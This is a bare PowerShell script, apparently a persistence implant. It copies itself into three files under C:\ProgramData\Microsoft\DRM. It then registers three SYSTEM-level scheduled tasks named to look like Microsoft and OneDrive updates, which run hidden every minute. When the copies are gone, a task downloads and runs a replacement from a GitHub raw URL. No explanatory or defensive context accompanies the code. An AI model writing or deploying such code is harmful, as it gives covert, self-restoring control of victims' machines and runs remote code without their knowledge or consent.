function Gen-Info {
    # CREATION
    $alfa_path = "C:\ProgramData\Microsoft\DRM"
    $bravo_path = "C:\ProgramData\Microsoft\DRM"
    $charlie_path = "C:\ProgramData\Microsoft\DRM"
    
    $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
    $funcBody = (Get-Command Gen-Info).ScriptBlock.ToString()
    if (-not (Test-Path "$alfa_path\alfa.ps1")) {
        "function Gen-Info {$funcBody`n}`nGen-Info`n# $random_chars" | Out-File -FilePath "$alfa_path\alfa.ps1" -Encoding UTF8
    }
    
    $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
    if (-not (Test-Path "$bravo_path\bravo.ps1")) {
        "function Gen-Info {$funcBody`n}`nGen-Info`n# $random_chars" | Out-File -FilePath "$bravo_path\bravo.ps1" -Encoding UTF8
    }
    
    $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
    if (-not (Test-Path "$charlie_path\charlie.ps1")) {
        "function Gen-Info {$funcBody`n}`nGen-Info`n# $random_chars" | Out-File -FilePath "$charlie_path\charlie.ps1" -Encoding UTF8
    }
    
    
    # SCHEDULE TASK CREATION
    
    $cmd = "if (-not (Test-Path '$alfa_path\alfa.ps1') -and -not (Test-Path '$bravo_path\bravo.ps1') -and -not (Test-Path '$charlie_path\charlie.ps1')) { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/alfa.ps1', '$alfa_path\alfa.ps1') } else { if (Test-Path '$alfa_path\alfa.ps1') { & '$alfa_path\alfa.ps1' }; if (Test-Path '$bravo_path\bravo.ps1') { & '$bravo_path\bravo.ps1' }; if (Test-Path '$charlie_path\charlie.ps1') { & '$charlie_path\charlie.ps1' } }"
    
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$cmd`""
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -ExecutionTimeLimit (New-TimeSpan)
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)
    
    $task_alfa = "MicrosoftUpdate"
    if (-not (Get-ScheduledTask -TaskName $task_alfa -ErrorAction SilentlyContinue)) {
        Register-ScheduledTask -TaskName $task_alfa -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
    }
    
    $task_bravo = "OneDrive"
    if (-not (Get-ScheduledTask -TaskName $task_bravo -ErrorAction SilentlyContinue)) {
        Register-ScheduledTask -TaskName $task_bravo -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
    }
    
    $task_charlie = "WindowsUpdate"
    if (-not (Get-ScheduledTask -TaskName $task_charlie -ErrorAction SilentlyContinue)) {
        Register-ScheduledTask -TaskName $task_charlie -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
    }
}

Gen-Info


